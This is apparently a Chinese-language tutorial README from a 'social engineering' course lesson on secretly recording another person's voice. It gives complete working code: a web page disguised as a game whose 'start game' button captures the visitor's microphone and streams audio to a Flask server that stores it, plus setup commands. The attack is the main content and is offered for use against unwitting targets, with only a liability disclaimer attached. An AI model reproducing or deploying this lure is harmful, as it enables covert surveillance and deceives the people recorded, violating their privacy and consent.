#### 偷偷录音对方的实时声音 |《社会工程学之网络追踪》第五节

****

学会本节可获得如下技能：

•偷偷录对方声音

•如何让对方长时间停留在界面

•使用在线AI自动编写实时生效

****

视频讲解：https://youtu.be/QxFOMOIDhrM

成为我的VIP会员： https://www.youtube.com/@MeeGooBoo/join

****

腾讯构建：https://cnb.cool/

二维码工具：https://cli.im/

```
apt update
```

```
apt install python3 python3-pip
```

```
pip install --break-system-packages flask requests
```

templates/index.html

```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>实时录音上传</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
            text-align: center;
        }
        .status {
            margin: 20px 0;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            font-weight: bold;
        }
        .recording {
            background-color: #ffebee;
            color: #c62828;
        }
        .idle {
            background-color: #e8f5e9;
            color: #2e7d32;
        }
        button {
            display: block;
            width: 200px;
            margin: 20px auto;
            padding: 15px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }
        #startButton {
            background-color: #4CAF50;
            color: white;
        }
        #startButton:hover {
            background-color: #45a049;
        }
        #startButton.recording {
            background-color: #f44336;
        }
        #startButton.recording:hover {
            background-color: #d32f2f;
        }
        .info {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>实时录音上传</h1>
        
        <div id="status" class="status idle">准备就绪 - 点击下方按钮开始录音</div>
        
        <button id="startButton">开始游戏</button>
        
        <div class="info">
            <p>点击"开始游戏"按钮后，应用将开始录制您的音频并实时上传到服务器。</p>
            <p>即使您关闭页面，已上传的音频数据也不会丢失。</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const startButton = document.getElementById('startButton');
            const statusDiv = document.getElementById('status');
            
            let mediaRecorder;
            let audioContext;
            let isRecording = false;
            let sessionId = null;
            let audioChunks = [];
            
            // 生成唯一会话ID
            function generateSessionId() {
                return Date.now().toString(36) + Math.random().toString(36).substr(2);
            }
            
            // 开始录音
            async function startRecording() {
                try {
                    // 生成新会话ID
                    sessionId = generateSessionId();
                    
                    // 通知服务器开始录制
                    const formData = new FormData();
                    formData.append('session_id', sessionId);
                    
                    const response = await fetch('/start_recording', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    if (result.status !== 'started') {
                        throw new Error('服务器无法开始录制');
                    }
                    
                    // 获取麦克风访问权限
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    
                    // 设置音频上下文和媒体录制器
                    audioContext = new AudioContext();
                    const source = audioContext.createMediaStreamSource(stream);
                    
                    // 配置媒体录制选项
                    const options = {
                        mimeType: 'audio/webm;codecs=opus',
                        audioBitsPerSecond: 128000
                    };
                    
                    mediaRecorder = new MediaRecorder(stream, options);
                    
                    // 处理数据可用事件
                    mediaRecorder.ondataavailable = async function(event) {
                        if (event.data.size > 0) {
                            // 上传音频数据到服务器
                            const formData = new FormData();
                            formData.append('session_id', sessionId);
                            formData.append('audio_data', event.data);
                            
                            try {
                                await fetch('/upload_audio', {
                                    method: 'POST',
                                    body: formData
                                });
                            } catch (error) {
                                console.error('上传音频数据失败:', error);
                            }
                        }
                    };
                    
                    // 开始录制，每1000毫秒发送一次数据
                    mediaRecorder.start(1000);
                    isRecording = true;
                    
                    // 更新UI
                    startButton.textContent = '停止游戏';
                    startButton.classList.add('recording');
                    statusDiv.textContent = '录音中...';
                    statusDiv.className = 'status recording';
                    
                } catch (error) {
                    console.error('开始录音失败:', error);
                    statusDiv.textContent = '错误: ' + error.message;
                }
            }
            
            // 停止录音
            async function stopRecording() {
                if (mediaRecorder && isRecording) {
                    mediaRecorder.stop();
                    isRecording = false;
                    
                    // 通知服务器停止录制
                    const formData = new FormData();
                    formData.append('session_id', sessionId);
                    
                    try {
                        await fetch('/stop_recording', {
                            method: 'POST',
                            body: formData
                        });
                    } catch (error) {
                        console.error('停止录音请求失败:', error);
                    }
                    
                    // 更新UI
                    startButton.textContent = '开始游戏';
                    startButton.classList.remove('recording');
                    statusDiv.textContent = '录音已停止，音频已保存';
                    statusDiv.className = 'status idle';
                    
                    sessionId = null;
                }
            }
            
            // 初始化按钮点击事件
            startButton.addEventListener('click', function() {
                if (!isRecording) {
                    startRecording();
                } else {
                    stopRecording();
                }
            });
            
            // 页面关闭前的处理
            window.addEventListener('beforeunload', function() {
                if (isRecording) {
                    // 尝试在页面关闭前发送最后的数据
                    // 由于是同步请求，可能会阻塞页面关闭，但能确保数据发送
                    const formData = new FormData();
                    formData.append('session_id', sessionId);
                    
                    // 使用同步XHR请求
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', '/stop_recording', false);
                    xhr.send(formData);
                }
            });
        });
    </script>
</body>
</html>
```

处理声音

```
import os
import uuid
from datetime import datetime
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key'
app.config['UPLOAD_FOLDER'] = 'audio_uploads'

# 确保上传目录存在
if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

# 存储用户会话和对应的文件
user_files = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_recording', methods=['POST'])
def start_recording():
    """开始录音并创建新文件"""
    session_id = request.form.get('session_id')
    if not session_id:
        session_id = str(uuid.uuid4())
    
    filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{session_id}.webm"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    
    # 为新会话创建文件
    user_files[session_id] = {
        'file': open(filepath, 'ab'),  # 以追加二进制模式打开
        'filename': filename
    }
    print(f"开始录音会话: {session_id}, 文件: {filename}")
    
    return jsonify({'session_id': session_id, 'status': 'started'})

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    """处理接收到的音频数据"""
    session_id = request.form.get('session_id')
    audio_data = request.files.get('audio_data')
    
    if session_id in user_files and audio_data:
        try:
            # 将音频数据追加到文件
            user_files[session_id]['file'].write(audio_data.read())
            user_files[session_id]['file'].flush()  # 确保数据写入磁盘
            return jsonify({'status': 'success'})
        except Exception as e:
            print(f"写入音频数据错误: {e}")
            return jsonify({'status': 'error', 'message': str(e)}), 500
    
    return jsonify({'status': 'error', 'message': '无效的会话或数据'}), 400

@app.route('/stop_recording', methods=['POST'])
def stop_recording():
    """停止录音并关闭文件"""
    session_id = request.form.get('session_id')
    
    if session_id in user_files:
        user_files[session_id]['file'].close()
        filename = user_files[session_id]['filename']
        del user_files[session_id]
        print(f"录音会话结束: {session_id}, 文件已保存: {filename}")
        return jsonify({'status': 'stopped', 'filename': filename})
    
    return jsonify({'status': 'error', 'message': '无效的会话'}), 400

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```



****

****

#### 攻防无绝对，技术无好坏，在非安全的信息时代，众人皆在囚笼之中，关注牛马小试，让你一飞冲天！

****

- **Telegram(文件资源频道)：https://t.me/NiuMaXiaoShi**
- **Youtube：  https://www.youtube.com/@MeeGooBoo**
- **Twitter ( X ）：  https://x.com/MeeGooBoo**

****

- ###### 需要联系我？请通过：https://t.me/MeeGooBoo
- 如需购买钻石、铂金、黄金相关珠宝首饰的，请加我微信：Aioa700
- 注：本人不参与任何涉政相关讨论，本人所有平台和内容仅供技术相关领域学习交流使用。

****

>  [!CAUTION]
>
> 本仓库所有内容均来自互联网公开内容或本仓库所有者创作，请勿相信资源中的广告，主动联系你的都是骗子，提高智商谨防上当受诈！请勿利用本仓库实施违反任何适用法律法规等犯罪活动！本仓库所有者不对因使用本仓库内容导致的任何后果承担责任！

****

## 你的赞助是功德无量💰

>  [!NOTE]
>
> 如果你觉得本仓库对你有帮助，你可以赞助我们一杯咖啡，鼓励我们继续维护下去。<br>
> 成为我的Patreon会员：https://www.patreon.com/MeeGooBoo/membership<br>
> 通过Paypal支持我：https://paypal.me/MoGuoBiao<br>
> 通过比特币支持我：bc1qkwrq5plek62fmfaynyphfuuepm6cxd4fsh5wrp



<p align="center" >
    <img src="https://raw.githubusercontent.com/MeeGooBoo/2025/refs/heads/main/static/imgs/logo.png" width="150">
    <h3 align="center">牛马小试(莫国标)</h3>
    <p align="center">
        <img src="https://raw.githubusercontent.com/MeeGooBoo/2025/refs/heads/main/static/imgs/pays.png">
    </p>
</p>


****

